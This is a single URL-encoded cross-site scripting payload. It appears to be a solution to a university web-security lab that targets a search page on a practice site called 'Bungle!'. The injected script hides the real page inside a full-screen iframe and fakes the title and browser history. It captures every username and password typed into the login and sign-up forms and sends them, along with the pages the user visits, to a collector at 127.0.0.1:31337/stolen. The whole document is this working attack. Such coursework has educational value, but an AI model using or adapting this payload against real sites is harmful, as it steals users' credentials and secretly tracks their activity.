http://trurl.cs.illinois.edu/search?xssdefense=4&q=<script>function payload(attacker) {%0A var entry_flag %3D true%3B%0A function log(data) {%0A console.log(%24.param(data))%0A %24.get(attacker%2C data)%3B%0A }%0A function proxy(href) {%0A %24(`body`).html(``)%3B%0A var iframe %3D %24(`<iframe>`)%0A .css({%0A position%3A `absolute`%2C%0A height%3A `100%25`%2C%0A width%3A `100%25`%2C%0A border%3A `none`%0A })%0A .attr(`id`%2C `aquaman`)%0A .attr(`src`%2C href)%0A .appendTo(`body`)%0A .load(function() {%0A %2F%2F loading the fake website for the first time (by clicking the trap link)%0A if(entry_flag) {%0A %24(`head title`%2C window.parent.document).text(`Bungle!`)%3B%0A history.replaceState({home%3A 0}%2C `home`%2C `.%2F`)%3B%0A entry_flag %3D false%3B%0A }%0A log({event%3A `nav`%2C user%3A %24(`%23aquaman`).contents().find(`%23logged-in-user`).text()%2C uri%3A `.%2F`})%3B%0A %24(`body`%2C this.contentDocument)%0A %2F%2F clicking Bungle! logo %0A .find(`a`)%0A .click(function() {%0A %24(`head title`%2C window.parent.document).text(`Bungle!`)%3B%0A if(%24(`%23aquaman`).contents().find(`%23logged-in-user`).text()) {%0A history.replaceState({logged_in%3A 1}%2C `logged_in`%2C `.%2F`)%3B%0A } else {%0A history.replaceState({home%3A 0}%2C `home`%2C `.%2F`)%3B%0A }%0A log({event%3A `nav`%2C user%3A %24(`%23aquaman`).contents().find(`%23logged-in-user`).text()%2C uri%3A `.%2F`})%3B%0A })%0A .end()%0A %2F%2F For each time a button is clicked%2C perform and log the expected action.%0A .find(`form`)%0A .submit(function(event) {%0A var str %3D %24(this).serialize()%3B%0A var u_pos1 %3D str.indexOf(`%3D`)%2B1%3B%0A var u_pos2 %3D str.indexOf(`%26`)%3B%0A var p_pos1 %3D str.lastIndexOf(`%3D`)%2B1%3B%0A var p_pos2 %3D str.length%3B%0A var user_id %3D str.substring(u_pos1%2C u_pos2)%3B%0A var user_pw %3D str.substring(p_pos1%2C p_pos2)%3B%0A if(%24(this).attr(`action`) %3D%3D `.%2Flogin`) {%0A log({event%3A `login`%2C user%3A user_id%2C pass%3A user_pw})%3B%0A history.pushState({logged_in%3A 1}%2C `logged_in`%2C `.%2F`)%3B%0A } else if(%24(this).attr(`action`) %3D%3D `.%2Fcreate`) {%0A log({event%3A `create`%2C user%3A user_id%2C pass%3A user_pw})%3B%0A history.pushState({logged_in%3A 1}%2C `logged_in`%2C `.%2F`)%3B %0A } else if(%24(this).attr(`action`) %3D%3D `.%2Flogout`) {%0A %24(`head title`%2C window.parent.document).text(`Bungle!`)%3B%0A log({event%3A `logout`%2C user%3A %24(`%23aquaman`).contents().find(`%23logged-in-user`).text()})%3B%0A history.pushState({home%3A 0}%2C `home`%2C `.%2F`)%3B%0A } else if(%24(this).attr(`action`) %3D%3D `.%2Fsearch`) {%0A %24(`head title`%2C window.parent.document).text(`Search Results`)%3B%0A var query %3D %24(`%23aquaman`).contents().find(`%23query`).val()%3B%0A var newhref %3D `.%2Fsearch%3Fq%3D` %2B query%3B%0A log({event%3A `nav`%2C user%3A %24(`%23aquaman`).contents().find(`%23logged-in-user`).text()%2C uri%3A newhref})%3B%0A history.pushState({searched%3A 2}%2C `searched`%2C newhref)%3B%0A }%0A })%0A .end()%3B%0A })%3B%0A }%0A proxy(`.%2F`)%3B%0A}%3Bpayload(`http%3A%2F%2F127.0.0.1%3A31337%2Fstolen`)%3B<%2Fscript>
